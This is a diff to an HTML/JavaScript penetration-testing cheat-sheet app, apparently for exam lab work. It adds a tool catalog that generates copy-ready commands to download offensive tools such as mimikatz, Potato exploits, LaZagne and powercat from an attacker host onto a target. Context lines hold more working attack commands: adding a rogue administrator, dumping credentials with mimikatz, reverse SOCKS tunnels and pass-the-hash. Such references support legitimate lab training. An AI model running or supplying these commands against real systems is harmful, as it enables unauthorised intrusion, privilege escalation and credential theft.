@@ -317,6 +317,28 @@ pre.stab-cmd:hover{border-color:var(--green);background:rgba(63,185,80,.07)}
 .stab-note{font-size:11px;color:var(--text3);padding-top:8px;border-top:1px solid var(--border);margin-top:8px;line-height:1.5}
 
 /* ── Auto Transfer Block ────────────────────────────────────── */
+/* ── Tool Catalog Modal ───────────────────────────────────────── */
+.tcat-bar{display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;align-items:center}
+.tcat-search{flex:1;min-width:160px;padding:6px 10px;border:1px solid var(--border);border-radius:var(--radius);background:var(--bg3);color:var(--text);font-family:var(--font);font-size:13px;outline:none}
+.tcat-search:focus{border-color:var(--cyan)}
+.tcat-tab{padding:4px 13px;border:1px solid var(--border);border-radius:var(--radius);background:transparent;color:var(--text2);cursor:pointer;font-family:var(--font);font-size:11px;font-weight:700;white-space:nowrap}
+.tcat-tab.active{background:var(--cyan);color:#000;border-color:var(--cyan)}
+.tcat-count{font-size:11px;color:var(--text3);margin-left:auto}
+.tcat-grid{display:flex;flex-direction:column;gap:4px;overflow-y:auto;max-height:56vh;padding-right:4px}
+.tcat-item{background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);padding:8px 12px}
+.tcat-head{display:flex;align-items:center;gap:7px;margin-bottom:5px;flex-wrap:wrap}
+.tcat-name{font-weight:700;color:var(--text);font-size:13px;font-family:var(--font)}
+.tcat-tag{padding:1px 7px;border-radius:10px;font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.3px}
+.tcat-win{background:rgba(88,166,255,.18);color:var(--cyan)}
+.tcat-ps{background:rgba(188,100,255,.18);color:#bc8cff}
+.tcat-lin{background:rgba(63,185,80,.18);color:var(--green)}
+.tcat-cat{background:rgba(100,100,100,.15);color:var(--text3)}
+.tcat-path{font-size:10px;color:var(--text3);font-family:var(--font);margin-left:auto}
+.tcat-cmds{display:flex;flex-direction:column;gap:2px}
+.tcat-method{font-size:9px;color:var(--text3);text-transform:uppercase;font-weight:700;letter-spacing:.4px;margin-top:5px}
+pre.tcat-cmd{font-size:11.5px;padding:5px 10px;margin:2px 0;background:var(--bg4);border:1px solid var(--border);border-radius:4px;cursor:pointer;white-space:pre-wrap;word-break:break-all}
+pre.tcat-cmd:hover{border-color:var(--cyan);background:var(--bg2)}
+.tcat-empty{color:var(--text2);padding:32px;text-align:center;font-size:13px}
 .auto-xfer{background:rgba(88,166,255,.05);border:1px solid rgba(88,166,255,.2);border-radius:var(--radius);margin:10px 0 16px;overflow:hidden}
 .xfer-header{display:flex;align-items:center;justify-content:space-between;padding:7px 12px;cursor:pointer;font-size:11px;font-weight:700;color:var(--cyan);letter-spacing:.3px;text-transform:uppercase;user-select:none}
 .xfer-header:hover{background:rgba(88,166,255,.08)}
@@ -342,6 +364,7 @@ pre.xfer-cmd{font-size:11px;padding:7px 12px;margin:3px 0;background:var(--bg4)}
   <button class="topbar-btn" onclick="toggleTheme()" title="Toggle dark/light">&#9790;</button>
   <button class="topbar-btn" onclick="toggleTimer()" title="Exam timer">&#9200;</button>
   <span id="timer">00:00</span>
+  <button class="topbar-btn" onclick="openModal('tools-modal');renderToolCatalog()" title="All downloadable tools with copy-ready commands">&#11015; Tools</button>
   <button class="topbar-btn" onclick="openModal('si-modal')" title="Paste systeminfo/uname → detect vulnerabilities">&#128269; Parse</button>
   <button class="topbar-btn" onclick="openModal('compat-modal')" title="OS × Exploit compatibility table">&#128202; Compat</button>
   <button class="topbar-btn" onclick="openModal('dt-modal');dtInit()" title="Interactive privesc decision tree">&#127807; Guide</button>
@@ -396,6 +419,29 @@ pre.xfer-cmd{font-size:11px;padding:7px 12px;margin:3px 0;background:var(--bg4)}
   <div class="var-group lin-only-var">
     <span class="var-label">LFILE</span>
     <input class="var-input" id="v-lfile" placeholder="/tmp/shell.sh" style="width:110px" oninput="updateAll()">
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!--  MODAL: TOOL CATALOG                                       -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="modal-overlay" id="tools-modal" onclick="overlayClose(event,'tools-modal')">
+  <div class="modal" style="max-width:860px">
+    <div class="modal-header">
+      <span class="modal-title">&#11015; Tool Catalog — copy-ready download commands (uses KALI_IP &amp; PORT from varbar)</span>
+      <button class="modal-close" onclick="closeModal('tools-modal')">&#215;</button>
+    </div>
+    <div class="modal-body">
+      <div class="tcat-bar">
+        <input class="tcat-search" id="tcat-q" placeholder="&#128269; Filter by name or category…" oninput="renderToolCatalog()">
+        <button class="tcat-tab active" id="tcat-all" onclick="tcatSetTab('all')">All</button>
+        <button class="tcat-tab" id="tcat-win" onclick="tcatSetTab('win')">Win EXE</button>
+        <button class="tcat-tab" id="tcat-ps"  onclick="tcatSetTab('ps')">PowerShell</button>
+        <button class="tcat-tab" id="tcat-lin" onclick="tcatSetTab('lin')">Linux</button>
+        <span class="tcat-count" id="tcat-count"></span>
+      </div>
+      <div class="tcat-grid" id="tcat-grid"></div>
+    </div>
   </div>
 </div>
 
@@ -1011,9 +1057,11 @@ Services in C:\Windows\System32 are almost never exploitable. Look for services 
 <div class="cmd-wrap"><div class="cmd-label">TRANSFER — download tools to target first</div>
 <pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/accesschk.exe -Outfile {{WPATH}}\accesschk.exe
 iwr -uri http://{{KALI_IP}}:{{PORT}}/scripts/PowerUp.ps1 -Outfile {{WPATH}}\PowerUp.ps1
+iwr -uri http://{{KALI_IP}}:{{PORT}}/scripts/Accesschk.ps1 -Outfile {{WPATH}}\Accesschk.ps1
 iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SharpUp.exe -Outfile {{WPATH}}\SharpUp.exe</pre></div>
 <div class="alts">
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/accesschk.exe {{WPATH}}\accesschk.exe</code> — CMD</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/scripts/Accesschk.ps1 {{WPATH}}\Accesschk.ps1</code> — PS alternative (no EXE)</div>
 </div>
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
@@ -1035,6 +1083,15 @@ sc.exe query type= all state= all | findstr /i "SERVICE_NAME"</pre></div>
 {{WPATH}}\accesschk.exe -uwcqv "Users" * /accepteula
 {{WPATH}}\accesschk.exe -uwcqv "Authenticated Users" * /accepteula</pre></div>
 <div class="callout callout-warn"><strong>⚠️ accesschk version matters:</strong> New versions removed <code>/accepteula</code> flag — running without it pops a GUI dialog and <strong>freezes your CLI shell</strong>. Use the older v5.x from Sysinternals that still supports /accepteula. If you get no output or a hang → kill it and use <code>icacls</code> or winPEAS instead.</div>
+<div class="cmd-wrap"><div class="cmd-label">ALTERNATIVE: Accesschk.ps1 — pure PowerShell, no EXE, no hang (use when accesschk.exe fails)</div>
+<pre class="cmd">powershell -ep bypass -f {{WPATH}}\Accesschk.ps1</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">powershell -ep bypass -f {{WPATH}}\Accesschk.ps1 -Mode services</code> — writable service binaries/dirs</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">powershell -ep bypass -f {{WPATH}}\Accesschk.ps1 -Mode dirs -Target C:\ -Recurse</code> — writable dirs under C:\</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">powershell -ep bypass -f {{WPATH}}\Accesschk.ps1 -Mode registry</code> — writable service registry keys</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">powershell -ep bypass -f {{WPATH}}\Accesschk.ps1 -Mode path -Target "C:\Program Files\App\svc.exe"</code> — check specific file</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">powershell -ep bypass -f {{WPATH}}\Accesschk.ps1 -Mode all</code> — run all checks</div>
+</div>
 <div class="cmd-wrap"><div class="cmd-label">Confirm service start mode — AUTO means it restarts on reboot</div>
 <pre class="cmd">sc.exe qc &lt;ServiceName&gt;
 Get-CimInstance -ClassName win32_service | Select Name,StartMode,State | Where-Object {$_.Name -eq '&lt;ServiceName&gt;'}</pre></div>
@@ -1683,7 +1740,7 @@ reg save hklm\system {{WPATH}}\system</pre></div>
 impacket-secretsdump -security security -system system LOCAL
 samdump2 system sam</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Optional: Mimikatz if files can't be transferred</div>
-<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe -Outfile {{WPATH}}\mimikatz.exe
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/x64/mimikatz.exe -Outfile {{WPATH}}\mimikatz.exe
 mimikatz.exe "privilege::debug" "lsadump::sam /sam:\"{{WPATH}}\sam\" /system:\"{{WPATH}}\system\"" exit</pre></div>
 </div>
 
@@ -1983,7 +2040,7 @@ GodPotato → PrintSpoofer → SweetPotato → SigmaPotato → RoguePotato → J
 <div class="cmd-label">KALI FIRST — set up socat relay (port 135)</div>
 <div class="cmd-wrap"><pre class="cmd">socat tcp-listen:135,reuseaddr,fork tcp:{{TARGET}}:9999</pre></div>
 <div class="cmd-label">TRANSFER to target</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/RoguePotato.exe {{WPATH}}\rp.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/RoguePotato.exe {{WPATH}}\rp.exe</pre></div>
 <div class="cmd-label">ADD ADMIN user</div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\rp.exe -r {{KALI_IP}} -e "cmd /c net user pwned Password123! /add &amp;&amp; net localgroup Administrators pwned /add" -l 9999</pre></div>
 <div class="cmd-label">REV SHELL</div>
@@ -2303,7 +2360,7 @@ reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizat
 
 <div class="cmd-wrap"><div class="cmd-label">TRANSFER — download dump tools to target</div>
 <pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/procdump.exe -Outfile {{WPATH}}\procdump.exe
-iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe -Outfile {{WPATH}}\mimikatz.exe</pre></div>
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/x64/mimikatz.exe -Outfile {{WPATH}}\mimikatz.exe</pre></div>
 <div class="alts">
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/procdump.exe {{WPATH}}\procdump.exe</code> — CMD</div>
 </div>
@@ -2330,11 +2387,11 @@ Get-Process lsass</pre></div>
   <div class="badges"><span class="badge badge-creds">CREDS</span><span class="badge badge-new">NEW</span></div>
 </div>
 <div class="cmd-wrap"><div class="cmd-label">TRANSFER — download credential extraction tools</div>
-<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe -Outfile {{WPATH}}\mimikatz.exe
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/x64/mimikatz.exe -Outfile {{WPATH}}\mimikatz.exe
 iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/RunasCs.exe -Outfile {{WPATH}}\RunasCs.exe
 iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -Outfile {{WPATH}}\nc64.exe</pre></div>
 <div class="alts">
-  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe {{WPATH}}\mimikatz.exe</code> — CMD</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/x64/mimikatz.exe {{WPATH}}\mimikatz.exe</code> — CMD</div>
 </div>
 <div class="cmd-wrap"><div class="cmd-label">List all saved credentials</div>
 <pre class="cmd">cmdkey /list</pre></div>
@@ -2830,7 +2887,7 @@ curl -s -k -u admin:PASSWORD -X PUT https://localhost:8443/api/v1/scripts/ext/sc
 <div class="cmd-label">KALI — start server</div>
 <div class="cmd-wrap"><pre class="cmd">chisel server -p 8081 --reverse</pre></div>
 <div class="cmd-label">TRANSFER chisel to target</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/chisel.exe {{WPATH}}\chisel.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/chisel.exe {{WPATH}}\chisel.exe</pre></div>
 <div class="cmd-label">TARGET — connect back and create SOCKS5</div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\chisel.exe client {{KALI_IP}}:8081 R:socks</pre></div>
 <div class="cmd-label">KALI — route tools through proxy</div>
@@ -2912,7 +2969,7 @@ sudo umount /mnt/smb</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">mimikatz — Full Credential Extraction Workflow</div>
 <div class="cmd-label">TRANSFER</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/mimikatz.exe {{WPATH}}\mimi.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/x64/mimikatz.exe {{WPATH}}\mimi.exe</pre></div>
 <div class="cmd-label">EXTRACT all credentials</div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::wdigest" "vault::cred" "lsadump::sam" exit</pre></div>
 <div class="cmd-label">SAM dump (offline)</div>
@@ -2932,7 +2989,7 @@ sudo umount /mnt/smb</pre></div>
 <div class="cmd-wrap"><pre class="cmd">hashcat -m 13100 {{WPATH}}\roast.txt /usr/share/wordlists/rockyou.txt --force</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">SharpHound + BloodHound — AD Graph</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/SharpHound.exe {{WPATH}}\sh.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/SharpHound.exe {{WPATH}}\sh.exe</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\sh.exe -c All --zipfilename {{WPATH}}\bh.zip</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\sh.exe -c All,GPOLocalGroup --zipfilename {{WPATH}}\bh.zip</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">From Kali (no agent needed — use with valid creds)</div>
@@ -2995,9 +3052,9 @@ impacket-psexec WORKGROUP/Administrator@{{TARGET}} -hashes :NTLM_HASH</pre></div
 </div>
 <div class="subsection"><div class="subsection-title">PtH from Windows — mimikatz sekurlsa::pth</div>
 <div class="cmd-wrap"><div class="cmd-label">TRANSFER — download mimikatz to target first</div>
-<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe -Outfile {{WPATH}}\mimi.exe</pre></div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/x64/mimikatz.exe -Outfile {{WPATH}}\mimi.exe</pre></div>
 <div class="alts">
-  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe {{WPATH}}\mimi.exe</code> — CMD fallback</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/x64/mimikatz.exe {{WPATH}}\mimi.exe</code> — CMD fallback</div>
 </div>
 <div class="cmd-wrap"><div class="cmd-label">Spawn a new cmd.exe process with the hash injected</div>
 <pre class="cmd">{{WPATH}}\mimi.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:{{DOMAIN}} /ntlm:NTLM_HASH /run:cmd.exe" exit</pre></div>
@@ -5386,7 +5443,7 @@ sudo systemctl restart TARGET</pre></div>
 <div class="cmd-label">KALI — server</div>
 <div class="cmd-wrap"><pre class="cmd">chisel server -p 8081 --reverse</pre></div>
 <div class="cmd-label">TRANSFER chisel to target</div>
-<div class="cmd-wrap"><pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/chisel_linux -O /tmp/chisel &amp;&amp; chmod +x /tmp/chisel</pre></div>
+<div class="cmd-wrap"><pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/chisel_linux -O /tmp/chisel &amp;&amp; chmod +x /tmp/chisel</pre></div>
 <div class="cmd-label">TARGET — connect back with SOCKS5</div>
 <div class="cmd-wrap"><pre class="cmd">/tmp/chisel client {{KALI_IP}}:8081 R:socks</pre></div>
 <div class="cmd-label">KALI — use proxy</div>
@@ -6101,6 +6158,152 @@ function updateAll() {
   liveReplace();
   refreshTransferBlocks();
   renderStab();
+  if (document.getElementById('tools-modal')?.classList.contains('open')) renderToolCatalog();
+}
+
+// ── Tool Catalog ──────────────────────────────────────────────
+const TOOL_CATALOG = [
+  // Windows binaries — kind:'win'
+  {n:'winPEASx64.exe',     p:'windows/winPEASx64.exe',          k:'win', c:'enum'},
+  {n:'winPEAS.bat',        p:'windows/winPEAS.bat',             k:'win', c:'enum'},
+  {n:'winPEASany_ofs.exe', p:'windows/winPEASany_ofs.exe',      k:'win', c:'enum'},
+  {n:'SharpUp.exe',        p:'windows/SharpUp.exe',             k:'win', c:'enum'},
+  {n:'Seatbelt.exe',       p:'windows/Seatbelt.exe',            k:'win', c:'enum'},
+  {n:'SharpView.exe',      p:'windows/SharpView.exe',           k:'win', c:'enum'},
+  {n:'Snaffler.exe',       p:'windows/Snaffler.exe',            k:'win', c:'enum'},
+  {n:'accesschk.exe',      p:'windows/accesschk.exe',           k:'win', c:'enum'},
+  {n:'accesschk64.exe',    p:'windows/accesschk64.exe',         k:'win', c:'enum'},
+  {n:'GodPotato-NET4.exe', p:'windows/GodPotato-NET4.exe',      k:'win', c:'potato'},
+  {n:'GodPotato-NET2.exe', p:'windows/GodPotato-NET2.exe',      k:'win', c:'potato'},
+  {n:'PrintSpoofer64.exe', p:'windows/PrintSpoofer64.exe',      k:'win', c:'potato'},
+  {n:'SweetPotato.exe',    p:'windows/SweetPotato.exe',         k:'win', c:'potato'},
+  {n:'JuicyPotato.exe',    p:'windows/JuicyPotato.exe',         k:'win', c:'potato'},
+  {n:'JuicyPotatoNG.exe',  p:'windows/JuicyPotatoNG.exe',       k:'win', c:'potato'},
+  {n:'SigmaPotato.exe',    p:'windows/SigmaPotato.exe',         k:'win', c:'potato'},
+  {n:'RoguePotato.exe',    p:'windows/RoguePotato.exe',         k:'win', c:'potato'},
+  {n:'SharpEfsPotato.exe', p:'windows/SharpEfsPotato.exe',      k:'win', c:'potato'},
+  {n:'LocalPotato.exe',    p:'windows/LocalPotato.exe',         k:'win', c:'potato'},
+  {n:'churrasco.exe',      p:'windows/churrasco.exe',           k:'win', c:'potato'},
+  {n:'NetworkServiceExploit.exe',p:'windows/NetworkServiceExploit.exe',k:'win',c:'potato'},
+  {n:'FullPowers.exe',     p:'windows/FullPowers.exe',          k:'win', c:'tokens'},
+  {n:'SeManageVolumeExploit.exe',p:'windows/SeManageVolumeExploit.exe',k:'win',c:'tokens'},
+  {n:'RunasCs.exe',        p:'windows/RunasCs.exe',             k:'win', c:'tokens'},
+  {n:'mimikatz.exe',       p:'windows/x64/mimikatz.exe',        k:'win', c:'creds'},
+  {n:'LaZagne.exe',        p:'windows/LaZagne.exe',             k:'win', c:'creds'},
+  {n:'SharpDPAPI.exe',     p:'windows/SharpDPAPI.exe',          k:'win', c:'creds'},
+  {n:'SharpDump.exe',      p:'windows/SharpDump.exe',           k:'win', c:'creds'},
+  {n:'SafetyKatz.exe',     p:'windows/SafetyKatz.exe',          k:'win', c:'creds'},
+  {n:'SharpChrome.exe',    p:'windows/SharpChrome.exe',         k:'win', c:'creds'},
+  {n:'nc64.exe',           p:'windows/nc64.exe',                k:'win', c:'net'},
+  {n:'nc.exe',             p:'windows/nc.exe',                  k:'win', c:'net'},
+  {n:'chisel.exe',         p:'windows/chisel.exe',              k:'win', c:'tunnel'},
+  {n:'Rubeus.exe',         p:'windows/Rubeus.exe',              k:'win', c:'ad'},
+  {n:'Certify.exe',        p:'windows/Certify.exe',             k:'win', c:'ad'},
+  {n:'SharpHound.exe',     p:'windows/SharpHound.exe',          k:'win', c:'ad'},
+  {n:'Whisker.exe',        p:'windows/Whisker.exe',             k:'win', c:'ad'},
+  {n:'SharpGPOAbuse.exe',  p:'windows/SharpGPOAbuse.exe',       k:'win', c:'ad'},
+  {n:'KrbRelayUp.exe',     p:'windows/KrbRelayUp.exe',          k:'win', c:'ad'},
+  {n:'kerbrute_win.exe',   p:'windows/kerbrute_win.exe',        k:'win', c:'ad'},
+  // PowerShell scripts — kind:'ps'
+  {n:'Accesschk.ps1',      p:'scripts/Accesschk.ps1',           k:'ps',  c:'privesc'},
+  {n:'PowerUp.ps1',        p:'scripts/PowerUp.ps1',             k:'ps',  c:'privesc'},
+  {n:'PrivescCheck.ps1',   p:'scripts/PrivescCheck.ps1',        k:'ps',  c:'privesc'},
+  {n:'Sherlock.ps1',       p:'scripts/Sherlock.ps1',            k:'ps',  c:'privesc'},
+  {n:'jaws-enum.ps1',      p:'scripts/jaws-enum.ps1',           k:'ps',  c:'enum'},
+  {n:'WinPwn.ps1',         p:'scripts/WinPwn.ps1',              k:'ps',  c:'privesc'},
+  {n:'PowerSharpPack.ps1', p:'scripts/PowerSharpPack.ps1',      k:'ps',  c:'privesc'},
+  {n:'PowerView.ps1',      p:'scripts/PowerView.ps1',           k:'ps',  c:'ad'},
+  {n:'PowerView_BC.ps1',   p:'scripts/PowerView_BC.ps1',        k:'ps',  c:'ad'},
+  {n:'PowerUpSQL.ps1',     p:'scripts/PowerUpSQL.ps1',          k:'ps',  c:'net'},
+  {n:'Invoke-Mimikatz.ps1',p:'scripts/Invoke-Mimikatz.ps1',     k:'ps',  c:'creds'},
+  {n:'SessionGopher.ps1',  p:'scripts/SessionGopher.ps1',       k:'ps',  c:'creds'},
+  {n:'Invoke-Kerberoast.ps1',p:'scripts/Invoke-Kerberoast.ps1', k:'ps',  c:'ad'},
+  {n:'powercat.ps1',       p:'scripts/powercat.ps1',            k:'ps',  c:'shells'},
+  // Linux tools — kind:'lin'
+  {n:'linpeas.sh',                   p:'linux/linpeas.sh',                        k:'lin', c:'enum'},
+  {n:'linpeas_small.sh',             p:'linux/linpeas_small.sh',                  k:'lin', c:'enum'},
+  {n:'lse.sh',                       p:'linux/lse.sh',                            k:'lin', c:'enum'},
+  {n:'linuxprivchecker.py',          p:'linux/linuxprivchecker.py',               k:'lin', c:'enum'},
+  {n:'linux-exploit-suggester.sh',   p:'linux/linux-exploit-suggester.sh',        k:'lin', c:'exploit'},
+  {n:'pspy64',                       p:'linux/pspy64',                            k:'lin', c:'proc'},
+  {n:'pspy32',                       p:'linux/pspy32',                            k:'lin', c:'proc'},
+  {n:'socat',                        p:'linux/socat',                             k:'lin', c:'static'},
+  {n:'ncat',                         p:'linux/ncat',                              k:'lin', c:'static'},
+  {n:'chisel_linux',                 p:'linux/chisel_linux',                      k:'lin', c:'tunnel'},
+  {n:'kerbrute_linux',               p:'linux/kerbrute_linux',                    k:'lin', c:'ad'},
+  {n:'mimipenguin.py',               p:'linux/mimipenguin.py',                    k:'lin', c:'creds'},
+  {n:'mimipenguin.sh',               p:'linux/mimipenguin.sh',                    k:'lin', c:'creds'},
+  {n:'laZagne.py',                   p:'linux/laZagne.py',                        k:'lin', c:'creds'},
+];
+
+let _tcatTab = 'all';
+function tcatSetTab(t) {
+  _tcatTab = t;
+  ['all','win','ps','lin'].forEach(id => {
+    document.getElementById('tcat-'+id).classList.toggle('active', id===t);
+  });
+  renderToolCatalog();
+}
+
+function renderToolCatalog() {
+  const vars = getVars();
+  const ip   = (vars.KALI_IP && !vars.KALI_IP.startsWith('{{')) ? vars.KALI_IP : '&lt;KALI_IP&gt;';
+  const port = (vars.PORT    && !vars.PORT.startsWith('{{'))    ? vars.PORT    : '&lt;PORT&gt;';
+  const wp   = (vars.WPATH   && !vars.WPATH.startsWith('{{'))  ? vars.WPATH   : 'C:\\Temp';
+
+  const q = (document.getElementById('tcat-q')?.value||'').toLowerCase();
+  const items = TOOL_CATALOG.filter(t => {
+    if (_tcatTab !== 'all' && t.k !== _tcatTab) return false;
+    if (q && !t.n.toLowerCase().includes(q) && !t.c.includes(q)) return false;
+    return true;
+  });
+
+  document.getElementById('tcat-count').textContent = items.length + ' tool' + (items.length!==1?'s':'');
+
+  if (!items.length) {
+    document.getElementById('tcat-grid').innerHTML =
+      '<div class="tcat-empty">No tools match — try a different filter.</div>';
+    return;
+  }
+
+  const kindLabel = {win:'Win EXE', ps:'PowerShell', lin:'Linux'};
+  const kindCls   = {win:'tcat-win', ps:'tcat-ps', lin:'tcat-lin'};
+
+  const html = items.map(t => {
+    const url = `http://${ip}:${port}/${t.p}`;
+    const fn  = t.n;
+    let cmds  = [];
+
+    if (t.k === 'win' || t.k === 'ps') {
+      cmds = [
+        {m:'PowerShell (iwr)',  v:`iwr -uri ${url} -Outfile ${wp}\\${fn}`},
+        {m:'CMD (certutil)',    v:`certutil -urlcache -split -f ${url} ${wp}\\${fn}`},
+        {m:'WebClient',        v:`(New-Object Net.WebClient).DownloadFile('${url}','${wp}\\${fn}')`},
+      ];
+    } else {
+      cmds = [
+        {m:'wget', v:`wget ${url} -O /tmp/${fn} && chmod +x /tmp/${fn}`},
+        {m:'curl', v:`curl -o /tmp/${fn} ${url} && chmod +x /tmp/${fn}`},
+      ];
+    }
+
+    return `<div class="tcat-item">
+      <div class="tcat-head">
+        <span class="tcat-name">${escHtml(fn)}</span>
+        <span class="tcat-tag ${kindCls[t.k]}">${kindLabel[t.k]}</span>
+        <span class="tcat-tag tcat-cat">${t.c}</span>
+        <span class="tcat-path">${t.p}</span>
+      </div>
+      <div class="tcat-cmds">${cmds.map(c=>
+        `<div class="tcat-method">${c.m}</div><pre class="cmd tcat-cmd">${escHtml(c.v)}</pre>`
+      ).join('')}</div>
+    </div>`;
+  }).join('');
+
+  document.getElementById('tcat-grid').innerHTML = html;
+  document.querySelectorAll('#tcat-grid pre.cmd').forEach(el => {
+    if (!el.dataset.tpl) el.dataset.tpl = el.textContent;
+  });
 }
 
 // ── Live replace {{VAR}} in ALL command/code elements ─────────
@@ -6127,7 +6330,7 @@ const TOOL_MAP = {
   'JuicyPotato.exe':'windows/JuicyPotato.exe','RoguePotato.exe':'windows/RoguePotato.exe',
   'SharpEfsPotato.exe':'windows/SharpEfsPotato.exe','EfsPotato.cs':'windows/EfsPotato.cs',
   'LocalPotato.exe':'windows/LocalPotato.exe','SigmaPotato.exe':'windows/SigmaPotato.exe',
-  'mimikatz.exe':'windows/mimikatz.exe','LaZagne.exe':'windows/LaZagne.exe',
+  'mimikatz.exe':'windows/x64/mimikatz.exe','LaZagne.exe':'windows/LaZagne.exe',
   'Rubeus.exe':'windows/Rubeus.exe','Certify.exe':'windows/Certify.exe',
   'SharpHound.exe':'windows/SharpHound.exe','Whisker.exe':'windows/Whisker.exe',
   'SharpDPAPI.exe':'windows/SharpDPAPI.exe','SharpDump.exe':'windows/SharpDump.exe',
@@ -6149,6 +6352,7 @@ const TOOL_MAP = {
   'accesschk.exe':'windows/accesschk.exe',
   'laZagne.exe':'windows/LaZagne.exe',
   'SessionGopher.ps1':'scripts/SessionGopher.ps1',
+  'Accesschk.ps1':'scripts/Accesschk.ps1',
   'WinPwn.ps1':'scripts/WinPwn.ps1',
   'PowerView.ps1':'scripts/PowerView.ps1','PowerView_BC.ps1':'scripts/PowerView_BC.ps1',
   'PowerUp.ps1':'scripts/PowerUp.ps1','PrivescCheck.ps1':'scripts/PrivescCheck.ps1',
